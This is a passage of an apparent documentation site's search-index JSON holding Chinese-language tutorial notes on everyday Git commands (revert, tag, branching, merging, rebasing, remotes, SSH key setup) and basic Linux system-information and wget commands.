revert</code>\u6765\u64a4\u9500\u7b2c\u4e8c\u6b21\u4fee\u6539\uff08add b\uff09\uff1a</p> <pre><code>git revert fc442e084dd0a9b70c41bac313b2bc3a7c148a5b\n# \u6b64\u65f6\u4f1a\u8df3\u51fa\u4e00\u4e2acommit\u754c\u9762\nRemoving b\n[master eea53e9] Revert \"add b\"\n 1 file changed, 1 deletion(-)\n delete mode 100644 b\n</code></pre> <p>\u518d\u6b21\u8fd0\u884c<code>git log</code>\uff1a</p> <p></p> <p>\u8fd0\u884c<code>ls</code>\u547d\u4ee4\u67e5\u770b\u5f53\u524d\u6587\u4ef6\uff1a</p> <pre><code>~ ls\na c\n</code></pre> <p>\u7efc\u4e0a\u53ef\u4ee5\u5f97\u51fa\u7ed3\u8bba\uff1a</p> <ul> <li><code>git revert</code>\u662f HEAD \u7ee7\u7eed\u524d\u8fdb\uff0c\u53ea\u662f\u65b0\u7684 commit \u7684\u5185\u5bb9\u548c\u8981 revert \u7684\u5185\u5bb9\u6b63\u597d\u76f8\u53cd\uff0c\u4ee5\u6b64\u62b5\u6d88\u4fee\u6539\u3002\u5728\u672c\u4f8b\u4e2d\uff0c\u62b5\u6d88\u4e86\u7b2c\u4e8c\u6b21\u4fee\u6539\uff08add b\uff09</li> <li><code>git revert</code>\u4ec5\u4ec5\u9488\u5bf9\u6307\u5b9a\u7684\u63d0\u4ea4\u8fdb\u884c\u6062\u590d\uff0c\u4e0d\u4f1a\u5f71\u54cd\u5176\u4f59\u4efb\u4f55\u63d0\u4ea4\uff01\u6bd4\u5982\u672c\u4f8b\u4e2d<code>add a</code>\u548c<code>add c</code>\u4e24\u6b21\u63d0\u4ea4\u90fd\u6ca1\u6709\u5f71\u54cd\uff01</li> </ul> <p>git revert \u548c git reset \u7684\u533a\u522b</p> <ul> <li><code>git revert &lt;commit id&gt;</code>\uff1a\u518d\u6b21\u521b\u5efa\u4e00\u4e2a\u63d0\u4ea4\uff0c\u672c\u6b21\u63d0\u4ea4\u7684\u4fee\u6539\u548c<code>&lt;commit id&gt;</code>\u63d0\u4ea4\u7684\u4fee\u6539\u76f8\u53cd\uff0c\u6765\u5b9e\u73b0\u64a4\u9500\u7684\u6548\u679c\u3002</li> <li><code>git reset --hard HEAD &lt;commit id&gt;</code> \uff1a\u76f4\u63a5\u56de\u9000\u5230<code>&lt;commit id&gt;</code>\uff0c\u5220\u9664\u4e4b\u540e\u7684\u6240\u6709\u4fee\u6539\uff01</li> </ul> <p>\u4f7f\u7528<code>git reflog</code>\u67e5\u770b\u6240\u4f5c\u7684\u6240\u6709\u64cd\u4f5c\uff1a</p> <p></p>"},{"location":"tools/git/base/#git-tag","title":"git tag","text":"<p>\u6807\u7b7e\u7ba1\u7406</p> <pre><code>git tag &lt;-d&gt; &lt;tagname&gt;    # \u7ed9\u8be5\u5206\u652f\u6253\u4e0a\u6807\u7b7e\uff0c\u6ce8\u610f\u4e00\u5b9a\u8981\u5148\u4f7f\u7528git checkout\u5207\u6362\u5230\u4f60\u6240\u8981\u6dfb\u52a0\u6807\u7b7e\u7684\u5206\u652f\uff0c\u52a0\u4e0a-d\u5219\u4e3a\u5220\u9664\u8be5\u6807\u7b7e\ngit tag &lt;tagname&gt; &lt;commit id&gt;  # \u7ed9\u5df2\u7ecf\u63d0\u4ea4\u7684\u7248\u672c\u6253\u4e0a\u6807\u7b7e\uff0c\u5219\u9700\u8981\u5728\u540e\u9762\u52a0\u4e0a\u4ed6\u7684\u7248\u672c\u53f7\uff0c\u67e5\u8be2\u7248\u672c\u53f7\u53ef\u4ee5\u4f7f\u7528git reflog\ngit show &lt;tagname&gt;             # \u53ef\u4ee5\u67e5\u770b\u8be5\u6807\u7b7e\u540d\u7684\u7248\u672c\u7684\u5177\u4f53\u4fe1\u606f\n</code></pre> <p>\u6ce8\uff1a\u6240\u6709\u6807\u7b7e\u90fd\u53ea\u5b58\u50a8\u5728\u672c\u5730\uff0c\u4e0d\u4f1a\u63a8\u9001\u5230\u8fdc\u7a0b\u4ed3\u5e93\uff0c\u82e5\u8981\u63a8\u9001\u67d0\u4e2a\u6807\u7b7e\u5230\u8fdc\u7a0b\u4ed3\u5e93\uff0c\u5219\u4f7f\u7528\uff1a</p> <pre><code>git push origin &lt;tagname&gt;      # \u63a8\u9001\u6807\u7b7e\u5230\u8fdc\u7a0b\u4ed3\u5e93\ngit push origin --tag          # \u63a8\u9001\u6240\u6709tag\ngit push origin --all          # \u63a8\u9001\u6240\u6709\u5206\u652f\u548ctag\n</code></pre> <p>\u67d0\u4e2a\u6807\u7b7e\u5df2\u7ecf\u63a8\u9001\u5230\u8fdc\u7a0b\u4ed3\u5e93\uff0c\u5219\u9664\u4e86\u9700\u8981<code>git tag -d &lt;tagname&gt;</code>\u5220\u9664\u4e4b\u5916\uff0c\u8fd8\u9700\u8981\uff1a<code>git push origin :refs/tags/&lt;tagname&gt;</code>\u6765\u5220\u9664\u4e00\u4e2a\u8fdc\u7a0b\u6807\u7b7e\u3002</p>"},{"location":"tools/git/base/#references","title":"References","text":"<ul> <li>Linux \u521d\u59cb\u5316 Shell \u548c\u63d2\u4ef6</li> <li>Git\uff1a\u5206\u652f\u90a3\u4e9b\u4e8b\u513f</li> <li>Git\uff1a\u6d45\u6790\u8fdc\u7a0b\u534f\u4f5c</li> </ul>"},{"location":"tools/git/branch/","title":"Git\uff1a\u5206\u652f\u90a3\u4e9b\u4e8b\u513f","text":""},{"location":"tools/git/branch/#git-branch","title":"git branch","text":"<p>\u663e\u793a\u5f53\u524d\u5206\u652f\uff0c\u5220\u9664\u5206\u652f\uff0c\u65b0\u589e\u5206\u652f\uff0c\u5206\u652f\u91cd\u547d\u540d\uff0c\u8ddf\u8e2a\u8fdc\u7a0b\u5206\u652f\u7b49\u3002</p> <pre><code>git branch     # \u663e\u793a\u6240\u6709\u672c\u5730\u5206\u652f\u3002\n</code></pre> <p>Params\uff1a</p> \u53c2\u6570 \u6548\u679c -r \u663e\u793a\u6240\u6709\u8fdc\u7a0b\u5206\u652f\u3002\u56e0\u4e3a\u5206\u5e03\u5f0f\u7684\u5173\u7cfb\uff0c\u8fd9\u91cc\u7684\u8fdc\u7a0b\u5206\u652f\uff0c\u5176\u5b9e\u662f\u672c\u5730\u4ed3\u5e93\u4e2d\u5bf9\u5e94\u8fdc\u7a0b\u4ed3\u5e93\u5206\u652f\u7684\u672c\u5730\u6620\u5c04\uff0c\u5e76\u4e0d\u662f\u6307\u5b9e\u9645\u670d\u52a1\u5668\u4e0a\u7684\u5206\u652f\uff0c\u662f\u901a\u8fc7 pull \u6216\u8005 push \u7b49\u6765\u540c\u6b65\u7684\u3002 -a \u663e\u793a\u6240\u6709\u672c\u5730\u5206\u652f\u548c\u8fdc\u7a0b\u5206\u652f\u3002 -q/--no-merged \u663e\u793a\u5df2\u5408\u5e76/\u672a\u5408\u5e76\u5230\u5f53\u524d\u5206\u652f\u7684\u5206\u652f\u3002 -d \u5220\u9664\u5206\u652f\uff0c\u4f1a\u68c0\u67e5\u662f\u5426\u5df2\u5408\u5e76\uff0c\u5982\u679c\u672a\u5408\u5e76\u5219\u4f1a\u63d0\u793a\uff1a\u201c\u8fd8\u672a\u5408\u5e76\uff0c\u65e0\u6cd5\u5220\u9664\u201d\uff0c<code>-D</code> \u5219\u4f1a\u5f3a\u5236\u5220\u9664\u3002 -m \u5206\u652f\u91cd\u547d\u540d\uff0c\u4f1a\u68c0\u67e5\u65b0\u5206\u652f\u540d\u662f\u5426\u5b58\u5728\uff0c<code>-M</code>\u00b7\u5f3a\u5236\u91cd\u547d\u540d\u3002 --track/-t \u8ddf\u8e2a\u8fdc\u7a0b\u5206\u652f\uff0c\u4e0e\u8fdc\u7a0b\u5206\u652f\u7684\u6d41\u5173\u8054\uff0c\u53ef\u4ee5 pull \u6216\u8005 push\u3002\u4f8b\u5982\uff1agit branch --track foo origin/foo\uff0c\u8ddf\u8e2a\u8fdc\u7a0b\u5206\u652f foo\u3002 -vv \u67e5\u770b\u672c\u5730\u5206\u652f\u548c\u8fdc\u7a0b\u5206\u652f\u7684\u5173\u8054\u5173\u7cfb <p>zsh shortcut\uff1a<code>gb</code></p>"},{"location":"tools/git/branch/#git-checkout","title":"git checkout","text":"<p>\u68c0\u51fa\u67d0\u4e2a\u72b6\u6001\uff0c\u5373\u5feb\u7167\uff1a</p> <ul> <li>\u6587\u4ef6</li> <li>\u5206\u652f</li> </ul> \u547d\u4ee4 \u6548\u679c git checkout old-branch \u5207\u6362\u5230\u5df2\u7ecf\u5b58\u5728\u7684\u5206\u652f git checkout -b new-branch \u4ece\u5f53\u524d\u5206\u652f\u68c0\u51fa\u65b0\u5206\u652f new-branch git checkout -b new-branch [commit/tag] \u4ece\u67d0\u4e2a commit \u6216\u8005 tag\uff0c\u5206\u652f\u68c0\u51fa\u65b0\u5206\u652f new-branch git checkout -t origin/test-branch \u8ddf\u8e2a\u8fdc\u7a0b\u5206\u652f test-branch git checkout file1 \u68c0\u51fa\u6587\u4ef6 file1 \u5728 HEAD \u7684\u72b6\u6001\uff0c\u68c0\u51fa\u7684\u9ed8\u8ba4\u662f\u6682\u5b58\u533a\uff0c\u5373\u5982\u679c\u6682\u5b58\u533a\u6709 file1\uff0c\u68c0\u51fa\u7684\u662f\u6682\u5b58\u533a\u7684\u72b6\u6001\u3002git checkout HEAD file1 \u5219\u53ef\u4ee5\u68c0\u51fa HEAD \u7684\u6587\u4ef6\u72b6\u6001\u3002 git checkout -- file1 \u68c0\u51fa\u6587\u4ef6\u5728 HEAD\uff08\u6682\u5b58\u533a\u6709\u5219\u662f\u6682\u5b58\u533a\uff09\u7684\u72b6\u6001\uff0c\u5373\u4e22\u5f03\u5de5\u4f5c\u533a\u7684\u4fee\u6539 <p>zsh shortcut\uff1a</p> <ul> <li>git checkout\uff1a<code>gco</code></li> <li>git checkout -b\uff1a<code>gcb</code></li> </ul>"},{"location":"tools/git/branch/#git-merge","title":"git merge","text":"<p>\u5408\u5e76\u5206\u652f\u3002\u5047\u8bbe\u6211\u5f53\u524d\u5206\u652f\u662f master\u3002</p> <pre><code>git merge branch           # \u5c06 branch \u5206\u652f\u5408\u5e76\u5230 master \u5206\u652f\uff0c\u76f8\u5f53\u4e8egit merge --ff merge branch\ngit merge --no-ff branch   # \u521b\u5efa\u4e00\u4e2a\u65b0\u7684 commit\uff0c\u5177\u4f53\u89c1\u793a\u4f8b\ngit merge --squash branch  # \u5c06 branch \u5408\u5e76\u5230 master\uff0c\u4e14\u53ea\u6709\u4e00\u4e2a\u63d0\u4ea4\u8bb0\u5f55\n</code></pre> <p>zsh shortcut\uff1a<code>gm</code></p> <p>\u5408\u5e76\u5206\u652f\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u4f1a\u9047\u5230\u51b2\u7a81(Conflicts)\uff0c\u89e3\u51b3\u51b2\u7a81\u4e4b\u540e add \u6682\u5b58\uff0c\u7136\u540e commit \u63d0\u4ea4\u5373\u53ef\u3002</p> <p>gm branch \u4e0e gm --no-ff branch</p> <p><code>git merge</code>\u4e5f\u53ef\u4ee5\u5199\u6210<code>git merge --ff</code>\uff0c\u5176\u4e2d\u53c2\u6570<code>--ff</code>\u610f\u4e3a<code>fast-forward</code>\u3002\u8be5\u547d\u4ee4\u6307\u7684\u662f\u628a HEAD \u6307\u9488\u6307\u5411\u8981\u5408\u5e76\u5206\u652f\u7684\u5934\uff0c\u5b8c\u6210\u4e00\u6b21\u5408\u5e76\u3002</p> <p><code>git merge --no-ff</code>\u4e2d\u7684<code>--no-ff</code>\u610f\u4e3a\u5f3a\u884c\u5173\u6389<code>fast-forward</code>\uff0c\u6240\u4ee5\u5728\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f\u540e\uff0c\u5206\u652f\u5408\u5e76\u540e\u4f1a\u751f\u6210\u4e00\u4e2a\u65b0\u7684 commit\uff0c\u8fd9\u6837\uff0c\u5728\u4f7f\u7528<code>git log</code>\u4ece\u63d0\u4ea4\u5386\u53f2\u4e0a\u5c31\u53ef\u4ee5\u770b\u5230\u5206\u652f\u4fe1\u606f\u3002</p> <p>\u6d4b\u8bd5\u524d\u63d0\uff1amaster \u5206\u652f\u521b\u5efa\u4e86\u6587\u4ef6 a\uff0ctest \u5206\u652f\u68c0\u51fa\uff0c\u521b\u5efa\u6587\u4ef6 b\u3002</p> <pre><code>git init                    # \u521d\u59cb\u5316\u4ed3\u5e93\uff0c\u6b64\u65f6\u5206\u652f\u4e3a master\ntouch a                     # \u521b\u5efa\u6587\u4ef6a\nga --all                    # \u6dfb\u52a0\u5230\u6682\u5b58\u533a\ngcmsg \"master add a\"        # \u63d0\u4ea4\u5230\u672c\u5730\u4ed3\u5e93\ngcb test                    # \u68c0\u51fa\u5206\u652f test\ntouch b                     # \u521b\u5efa\u6587\u4ef6 b\nga --all                    # \u6dfb\u52a0\u5230\u6682\u5b58\u533a\ngcmsg \"test add b\"          # \u63d0\u4ea4\u5230\u672c\u5730\u4ed3\u5e93\ngco master                  # \u5207\u6362\u56de master \u5206\u652f\n</code></pre> <ul> <li><code>git merge test</code></li> </ul> <p></p> <ul> <li><code>git merge --no-ff test</code></li> </ul> <p></p> <p>\u7efc\u4e0a\u53ef\u77e5\uff1a</p> <ul> <li><code>git merge test</code>\uff1a\u4f1a\u76f4\u63a5\u5c06 master \u548c test \u5206\u652f\uff0c\u4ece\u68c0\u51fa\u7684\u90a3\u4e2a\u63d0\u4ea4\u70b9\u5f00\u59cb\u878d\u5408\u3002</li> <li><code>git merge --no-ff test</code>\uff1a\u4f1a\u4fdd\u7559\u539f test \u5206\u652f\u7684\u4fe1\u606f\uff0c\u5e76\u4e14\u8fdb\u884c\u4e00\u4e2a\u65b0\u7684\u63d0\u4ea4\u3002</li> </ul> <p>\u53c2\u8003\uff1aGit \u7248\u672c\u63a7\u5236\u7cfb\u5217\uff1a\u4f7f\u7528 git merge --no-ff \u5408\u5e76\u5206\u652f</p>"},{"location":"tools/git/branch/#git-rebase","title":"git rebase","text":"<p>\u4fd7\u79f0\u201c\u884d\u5408\u201d\u6216\u8005\u201c\u53d8\u57fa\u201d\uff0c\u4e0e<code>git merge</code>\u4e0d\u540c\uff0c<code>git rebase</code>\u4f1a\u5c06\u88ab\u5206\u652f\u7684 commit \u7eed \u5230\u5f53\u524d\u5206\u652f\u4e0a\uff0c\u8ba9 commit \u5386\u53f2\u5448\u73b0 \u5355\u7ebf \u7684\u72b6\u6001\uff0c\u975e\u5e38\u65b9\u4fbf\u8ffd\u6eaf\u95ee\u9898\u548c\u91cd\u7f6e\u4fee\u6539\u3002</p> <p>\u6ce8\u610f\uff1a\u4e00\u5b9a\u8981\u6ce8\u610f\u534f\u4f5c\u5206\u652f\u6216\u8005\u4e3b\u5e72\u5206\u652f\u7684 rebase\uff0c\u56e0\u4e3a\u8fd9\u4f1a\u6539\u53d8\u5386\u53f2\uff0c\u4f60\u7edd\u5bf9\u4e0d\u613f\u610f\u770b\u5230\u4e00\u4e2a\u534f\u4f5c\u5206\u652f\u6216\u8005\u4e3b\u5e72\u5206\u652f\u7684\u5386\u53f2\u53d8\u6765\u53d8\u53bb\uff0c\u5176\u4ed6\u540c\u5b66\u518d\u6765\u5408\u5e76\u7684\u65f6\u5019\u5c31\u4f1a\u663e\u793a\u5927\u91cf\u7684\u6539\u52a8\u5386\u53f2\uff0c\u4f46\u5185\u5bb9\u53c8\u6ca1\u6709\u4fee\u6539\uff0c\u751a\u81f3\u5bfc\u81f4\u5176\u4ed6\u540c\u5b66\u65e0\u6cd5\u6b63\u5e38\u62c9\u53d6\u66f4\u65b0\u3002</p> <p>\u793a\u4f8b\uff1a\u6b64\u65f6\u7684\u5206\u652f\u72b6\u6001\u5982\u56fe\uff0c\u5f00\u53d1\u4efb\u52a1\u5206\u53c9\u5230\u4e24\u4e2a\u4e0d\u540c\u5206\u652f\uff0c\u53c8\u5404\u81ea\u63d0\u4ea4\u4e86\u66f4\u65b0\u3002</p> <p></p> <p>\u65b9\u6848\u4e00\uff1a</p> <p>\u4f7f\u7528\uff1a<code>git merge --no-ff experiment</code> \uff08\u5f53\u524d\u5206\u652f master\uff09\uff0c\u6548\u679c\u5982\u56fe\uff1a</p> <p></p> <p>\u65b9\u6848\u4e8c\uff1a</p> <p>\u63d0\u53d6\u5728 <code>C4</code> \u4e2d\u5f15\u5165\u7684\u8865\u4e01\u548c\u4fee\u6539\uff0c\u7136\u540e\u5728 <code>C3</code> \u7684\u57fa\u7840\u4e0a\u5e94\u7528\u4e00\u6b21\u3002 \u5728 Git \u4e2d\uff0c\u8fd9\u79cd\u64cd\u4f5c\u5c31\u53eb\u505a \u53d8\u57fa\uff08rebase\uff09\u3002 \u4f60\u53ef\u4ee5\u4f7f\u7528 <code>rebase</code> \u547d\u4ee4\u5c06\u63d0\u4ea4\u5230\u67d0\u4e00\u5206\u652f\u4e0a\u7684\u6240\u6709\u4fee\u6539\u90fd\u79fb\u81f3\u53e6\u4e00\u5206\u652f\u4e0a\uff0c\u5c31\u597d\u50cf\u201c\u91cd\u65b0\u64ad\u653e\u201d\u4e00\u6837\u3002</p> <ul> <li>\u9996\u5148\uff0c\u68c0\u51fa <code>experiment</code> \u5206\u652f\uff0c\u7136\u540e\u5c06\u5b83\u53d8\u57fa\u5230 <code>master</code> \u5206\u652f\u4e0a</li> </ul> <pre><code>git checkout experiment\ngit rebase master # \u4ee5master\u4e3a\u57fa\u7840\n</code></pre> <p>\u5b83\u7684\u539f\u7406\u662f\u9996\u5148\u627e\u5230\u8fd9\u4e24\u4e2a\u5206\u652f\uff08\u5373\u5f53\u524d\u5206\u652f <code>experiment</code>\u3001\u53d8\u57fa\u64cd\u4f5c\u7684\u76ee\u6807\u57fa\u5e95\u5206\u652f <code>master</code>\uff09 \u7684\u6700\u8fd1\u5171\u540c\u7956\u5148 <code>C2</code>\uff0c\u7136\u540e\u5bf9\u6bd4\u5f53\u524d\u5206\u652f\u76f8\u5bf9\u4e8e\u8be5\u7956\u5148\u7684\u5386\u6b21\u63d0\u4ea4\uff0c\u63d0\u53d6\u76f8\u5e94\u7684\u4fee\u6539\u5e76\u5b58\u4e3a\u4e34\u65f6\u6587\u4ef6\uff0c \u7136\u540e\u5c06\u5f53\u524d\u5206\u652f\u6307\u5411\u76ee\u6807\u57fa\u5e95 <code>C3</code>, \u6700\u540e\u4ee5\u6b64\u5c06\u4e4b\u524d\u53e6\u5b58\u4e3a\u4e34\u65f6\u6587\u4ef6\u7684\u4fee\u6539\u4f9d\u5e8f\u5e94\u7528\u3002</p> <p></p> <ul> <li>\u6700\u540e\uff0c\u56de\u5230 <code>master</code> \u5206\u652f\uff0c\u8fdb\u884c\u4e00\u6b21\u5feb\u8fdb\u5408\u5e76\u3002</li> </ul> <pre><code>git checkout master\ngit merge experiment\n</code></pre> <p></p> <p>\u53c2\u8003\uff1aGit Docs \u5206\u652f - \u53d8\u57fa</p>"},{"location":"tools/git/branch/#references","title":"References","text":"<ul> <li>Git \u7248\u672c\u63a7\u5236\u7cfb\u5217\uff1a\u4f7f\u7528 git merge --no-ff \u5408\u5e76\u5206\u652f</li> <li>Git Docs \u5206\u652f - \u53d8\u57fa</li> <li>Git\uff1a\u8001\u53f8\u673a\u4e0a\u8def</li> <li>Git\uff1a\u6d45\u6790\u8fdc\u7a0b\u534f\u4f5c</li> </ul>"},{"location":"tools/git/remote/","title":"Git\uff1a\u6d45\u6790\u8fdc\u7a0b\u534f\u4f5c","text":""},{"location":"tools/git/remote/#ssh","title":"SSH \u79d8\u94a5","text":"<pre><code># 1. \u67e5\u770b\u662f\u5426\u5b58\u5728\u79d8\u94a5\uff0c\u82e5\u5b58\u5728\uff0c\u5219\u8df3\u8fc7\u4e0b\u9762\u7684\u6b65\u9aa4\nls -al ~/.ssh\n\n# 2. \u521b\u5efa\u79d8\u94a5\u5bf9\nssh-keygen -t ed25519 -C \"your_email@example.com\"\n# \u6ce8\uff1a\u5982\u679c\u60a8\u4f7f\u7528\u7684\u662f\u4e0d\u652f\u6301 Ed25519 \u7b97\u6cd5\u7684\u65e7\u7cfb\u7edf\uff0c\u8bf7\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1a\nssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\n# \u56de\u8f66\u4e09\u6b21\n</code></pre> <p>\u767b\u5f55\u5e76\u8bbe\u7f6e Github SSH keys\uff1a</p> <pre><code>cd ~/.ssh\ncat id_ed25519.pub\n# \u590d\u5236\uff0c\u5728Github\u8bbe\u7f6e\u4e2d\u70b9\u51fbNew SSH key\uff0c\u5c06\u516c\u94a5\u7c98\u8d34\u8fdb\u53bb\u5373\u53ef\u3002\n</code></pre>"},{"location":"tools/git/remote/#git-remote","title":"git remote","text":"<pre><code>git remote -v                                ## \u53ef\u4ee5\u67e5\u770b\u8be5\u672c\u5730\u4ed3\u5e93\u548c\u54ea\u4e2a\u8fdc\u7a0b\u4ed3\u5e93\u8fde\u63a5\uff0c\u82e5\u4e3a\u7a7a\uff0c\u5219\u8fdb\u884c\u8fde\u63a5\uff1a\ngit remote add origin git@github~.git        ## origin \u662f Git \u9ed8\u8ba4\u7684\u8fdc\u7a0b\u4ed3\u5e93\u540d\ngit remote rename origin &lt;new originname&gt;    ## \u66f4\u65b0 origin \u7684\u540d\u5b57\u4e3a newname\ngit remote remove origin                     ## \u5220\u9664 origin\n</code></pre> <p>\u67e5\u770b\u672c\u5730\u5206\u652f\u4e0e\u8fdc\u7a0b\u5206\u652f\u7684\u5173\u8054\uff1a<code>git branch -vv</code></p>"},{"location":"tools/git/remote/#git-clone","title":"git clone","text":"<p>\u514b\u9686\u4e00\u4e2a git \u9879\u76ee\uff1a</p> <pre><code>git clone git@github~.git\n</code></pre>"},{"location":"tools/git/remote/#git-push","title":"git push","text":"<p>\u5c06\u672c\u5730\u4ed3\u5e93\u7684\u63d0\u4ea4\u63a8\u9001\u5230\u8fdc\u7a0b\u4ed3\u5e93</p> <pre><code>git push                       ## \u63a8\u9001\u9ed8\u8ba4\u5206\u652f(\u5f53\u524d\u5206\u652f)\n\ngit push origin master\n# \u63a8\u9001\u6307\u5b9a\u5206\u652f master \u5230\u8fdc\u7a0b\u4ed3\u5e93\u7684 master \u5206\u652f\uff0c\u76f8\u5f53\u4e8e git push origin master:master\n\ngit push origin localbranch:remotebranch\n# \u63a8\u9001\u6307\u5b9a\u5206\u652f localbranch \u5230\u8fdc\u7a0b\u4ed3\u5e93\u7684 remotebranch \u5206\u652f,\u5982\u679cremotebranch\u4e0d\u5b58\u5728\uff0c\u5219\u521b\u5efa\n\n\ngit push origin :remote_branch  ## \u63a8\u9001\u201c\u7a7a\u5206\u652f\u201d\u5230\u8fdc\u7a0b\u4ed3\u5e93\u7684 remotebranch \u5206\u652f,\u5373\u5220\u9664\u8fdc\u7a0b\u4ed3\u5e93\u4e2d\u7684\u5206\u652f remotebranch\ngit push --delete remote_branch ## \u5220\u9664\u8fdc\u7a0b\u5206\u652f\uff0c\u6548\u679c\u540c\u4e0a\n\ngit push origin --tag          ## \u63a8\u9001\u6240\u6709tag\ngit push origin --all          ## \u63a8\u9001\u6240\u6709\u5206\u652f\u548ctag\n</code></pre> <p>Params</p> <ul> <li>--tag\uff1a\u63a8\u9001\u6240\u6709 tag</li> <li>--all\uff1a\u63a8\u9001\u6240\u6709\u5206\u652f\u548c tag</li> <li>--force\uff1a\u5f3a\u5236\u63a8\u9001\uff0c\u7528\u672c\u5730\u5206\u652f\u8986\u76d6\u8fdc\u7a0b\u5206\u652f</li> <li>--delete\uff1a\u5220\u9664\u8fdc\u7a0b\u5206\u652f</li> </ul> <p>zsh shortcut\uff1a<code>gp</code></p>"},{"location":"tools/git/remote/#git-fetch","title":"git fetch","text":"<p>\u5148\u8bf4\u8bf4\u4e00\u4e2a\u547d\u4ee4\uff1a<code>git branch -r</code>\uff0c\u8be5\u547d\u4ee4\u663e\u793a\u6240\u6709\u8fdc\u7a0b\u5206\u652f\u3002\u56e0\u4e3a\u5206\u5e03\u5f0f\u7684\u5173\u7cfb\uff0c\u8fd9\u91cc\u7684\u8fdc\u7a0b\u5206\u652f\uff0c\u5176\u5b9e\u662f\u672c\u5730\u4ed3\u5e93\u4e2d\u5bf9\u5e94\u8fdc\u7a0b\u4ed3\u5e93\u5206\u652f\u7684\u672c\u5730\u6620\u5c04\uff0c\u5e76\u4e0d\u662f\u6307\u5b9e\u9645\u670d\u52a1\u5668\u4e0a\u7684\u5206\u652f\uff0c\u662f\u901a\u8fc7 git fetch \u7b49\u6765\u540c\u6b65\u7684\u3002</p> <p>\u56e0\u6b64\uff0c<code>git fetch</code>\u7684\u4f5c\u7528\u5c31\u662f\u62c9\u53d6\u8fdc\u7a0b\u4ed3\u5e93\u4e2d\u6240\u6709\u5206\u652f\u7684\u66f4\u65b0\uff0c\u5e76\u540c\u6b65\u5230\u672c\u5730\u4ed3\u5e93\u4e2d\u7684\u8fdc\u7a0b\u5206\u652f\uff0c\u5373 origin/xxx\u3002</p>"},{"location":"tools/git/remote/#git-pull","title":"git pull","text":"<ul> <li> <p>\u7b80\u5355\u8bf4\uff1a\u62c9\u53d6\u5f53\u524d\u5206\u652f\u5bf9\u5e94\u7684\u8fdc\u7a0b\u4ed3\u5e93\u4e2d\u7684\u66f4\u65b0\uff0c\u5e76\u5408\u5e76\u5230\u5f53\u524d\u5206\u652f\u3002</p> </li> <li> <p>\u590d\u6742\u8bf4\uff1a\u62c9\u53d6\u9ed8\u8ba4\u8fdc\u7a0b\u4ed3\u5e93\u4e2d\u4e0e\u5f53\u524d\u5206\u652f\u5efa\u7acb\u4e86\u540c\u6b65\u6d41\u7684\u5206\u652f\uff08\u8fd9\u4e2a\u5206\u652f\u901a\u5e38\u662f\u548c\u5f53\u524d\u5206\u652f\u540c\u540d\uff09\uff0c\u5e76\u66f4\u65b0\u5230\u5f53\u524d\u5206\u652f\u3002\u901a\u5e38\u4e00\u4e2a\u4ed3\u5e93\u53ea\u6709\u4e00\u4e2a\u8fdc\u7a0b\u4ed3\u5e93\u914d\u7f6e\uff0c\u522b\u540d\u53eb\u505a origin\u3002</p> </li> </ul> <p>\u5b9e\u9645\u4e0a\uff0c<code>git pull</code> \u5305\u542b\u591a\u4e2a\u64cd\u4f5c\uff1a</p> <ol> <li><code>git fetch</code>\uff1a\u62c9\u53d6\u8fdc\u7a0b\u4ed3\u5e93\u4e2d\u6240\u6709\u5206\u652f\u7684\u66f4\u65b0\uff0c\u5e76\u540c\u6b65\u5230\u672c\u5730\u4ed3\u5e93\u4e2d\u7684\u8fdc\u7a0b\u5206\u652f\uff0c\u5373 origin/xxxx \u5206\u652f</li> <li><code>git merge</code>\uff1a\u5c06\u4e0e\u5f53\u524d\u5206\u652f\u5efa\u7acb\u4e86\u66f4\u65b0\u6d41\u7684\u8fdc\u7a0b\u5206\u652f\u5408\u5e76\uff08merge\uff09\u5230\u5f53\u524d\u5206\u652f</li> </ol> <pre><code>git pull origin                # \u62c9\u53d6\u8fdc\u7a0b\u4ed3\u5e93 origin\uff0c\u5982\u679c\u6709\u591a\u4e2a\u8fdc\u7a0b\u4ed3\u5e93\u65f6\uff0c\u9700\u8981\u663e\u5f0f\u7684\u6307\u5b9a\u8981\u62c9\u53d6\u7684\u8fdc\u7a0b\u4ed3\u5e93\u662f\u6bd4\u8f83\u5b89\u5168\u7684\ngit pull origin &lt;branch name&gt;  # \u62c9\u53d6\u8fdc\u7a0b\u4ed3\u5e93 origin \u7684\u6307\u5b9a\u5206\u652f\ngit pull origin &lt;remote_branch&gt;:&lt;local_branch&gt;  # \u62c9\u53d6\u8fdc\u7a0b\u4ed3\u5e93 origin \u7684\u5206\u652f\u5230\u6307\u5b9a\u7684\u672c\u5730\u5206\u652f\u4e0a\n</code></pre> <p>zsh shortcut\uff1a<code>gl</code></p>"},{"location":"tools/git/remote/#references","title":"References","text":"<ul> <li>Git\uff1a\u8001\u53f8\u673a\u4e0a\u8def</li> <li>Git\uff1a\u5206\u652f\u90a3\u4e9b\u4e8b\u513f</li> <li>Github \u65b0\u589e SSH \u5bc6\u94a5\u5230 GitHub \u5e10\u6237</li> </ul>"},{"location":"tools/linux/command/","title":"Linux \u5b9e\u7528\u547d\u4ee4","text":""},{"location":"tools/linux/command/#_1","title":"\u67e5\u770b\u7cfb\u7edf\u4fe1\u606f","text":"<pre><code>uname -a\ncat /etc/issue\nlsb_release -a\n\n# \u67e5\u770b\u5f53\u524d\u6587\u4ef6\u5939\u7684\u5927\u5c0f\ndu -sh\n# \u67e5\u770b\u5f53\u524d\u6587\u4ef6\u5939\u4e0b\u6bcf\u4e2a\u5b50\u6587\u4ef6\u5939\u5206\u522b\u591a\u5927\ndu -h --max-depth=1\n\n# \u4ee5\u4eba\u7c7b\u80fd\u770b\u61c2\u7684\u5355\u4f4d\u663e\u793a\u6587\u4ef6\u5927\u5c0f\nls -lh\n\n# \u67e5\u770bcpu\nlscpu\n\n# \u67e5\u770b\u5185\u5b58\u786c\u4ef6\ndmidecode -t memory\n\n# \u67e5\u770b\u5185\u5b58\u4f7f\u7528\u60c5\u51b5\nfree -g\nhtop\ntop\n\n# \u67e5\u770b\u8fdb\u7a0b\nps -ef | grep &lt;xxx&gt;\n</code></pre>"},{"location":"tools/linux/command/#wget","title":"wget\uff1a\u4e0b\u8f7d\u6587\u4ef6","text":"<pre><code>wget -c http://https://github.com/xxx/example/v1.whl\n</code></pre> <p>\u53c2\u6570\uff1a</p> <ul> <li>O\uff1a\u5c06\u6587\u4ef6\u4e0b\u8f7d\u5230\u6307\u5b9a\u76ee\u5f55\u4e2d</li> 